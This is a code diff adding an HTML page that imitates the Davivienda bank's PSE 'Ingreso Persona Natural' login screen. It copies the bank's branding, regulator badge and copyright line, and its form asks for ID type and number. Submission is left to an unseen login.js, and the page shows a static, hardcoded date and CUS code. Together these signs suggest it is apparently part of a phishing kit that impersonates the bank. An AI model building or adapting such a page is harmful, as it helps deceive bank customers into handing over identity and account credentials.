@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#E30613">
+<title>PSE - Davivienda</title>
+<link rel="icon" type="image/png" href="img/logo-davivienda2.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="login.css">
+</head>
+<body class="bodyPersonas">
+
+<div class="dav-wrapper">
+
+    <header class="dav-header">
+        <div class="dav-header-logo-wrap">
+            <img src="img/logo-davivienda2.png" alt="Davivienda" class="dav-logo">
+        </div>
+        <div class="dav-header-info">
+            <span id="dav-fecha">Sábado, 10 de octubre de 2026, 05:56 p. m.</span>
+            <br>
+            <span>Código único CUS: <strong id="dav-cus">000000000</strong></span>
+        </div>
+    </header>
+
+    <section class="dav-section">
+        <div class="dav-contenedorTabla">
+
+            <h1 align="center" class="dav-h1">Ingreso Persona Natural</h1>
+            <h2 align="center" class="dav-h2">Pagos en Línea y PSE</h2>
+
+            <div class="dav-form-card">
+
+                <p class="dav-form-titulo">Por favor ingrese la siguiente información:</p>
+
+                <form id="davFormLogin" autocomplete="off">
+
+                    <div class="dav-field">
+                        <label for="dav-tipo-doc">Tipo de documento</label>
+                        <select id="dav-tipo-doc" class="dav-select" required>
+                            <option value="01" selected>Cedula de Ciudadania</option>
+                            <option value="02">Cedula de Extranjeria</option>
+                            <option value="03">NIT</option>
+                            <option value="04">Tarjeta de Identidad</option>
+                            <option value="05">Pasaporte</option>
+                            <option value="06">Trj. Seguro Social Extranjero</option>
+                            <option value="07">Sociedad Extranjera sin NIT en Colombia</option>
+                            <option value="08">Fideicomiso</option>
+                            <option value="09">NIT Menores</option>
+                            <option value="10">RIF Venezuela</option>
+                            <option value="11">NIT Extranjeria</option>
+                            <option value="12">NIT Persona Natural</option>
+                            <option value="13">Registro Civil De Nacimiento</option>
+                            <option value="18">Permiso Proteccion Temporal</option>
+                        </select>
+                    </div>
+
+                    <div class="dav-field">
+                        <label for="dav-num-doc">No. de documento</label>
+                        <input type="tel" id="dav-num-doc" class="dav-input" inputmode="numeric" pattern="[0-9]*" maxlength="30" required>
+                    </div>
+
+                    <div class="dav-botones">
+                        <button type="submit" class="dav-btn-continuar" id="davBtnContinuar">Continuar</button>
+                        <button type="button" class="dav-btn-cancelar" id="davBtnCancelar">Cancelar</button>
+                    </div>
+
+                </form>
+
+            </div>
+
+        </div>
+    </section>
+
+    <footer class="dav-footer">
+        <div class="dav-footer-inner">
+            <p class="dav-footer-text">Banco Davivienda S.A. Todos los derechos reservados 2026.</p>
+            <div class="dav-footer-logos">
+                <img src="img/Vigilado.png" alt="Vigilado Superintendencia Financiera de Colombia" class="dav-vigilado">
+            </div>
+        </div>
+    </footer>
+
+</div>
+
+<script src="login.js"></script>
+
+</body>
+</html>
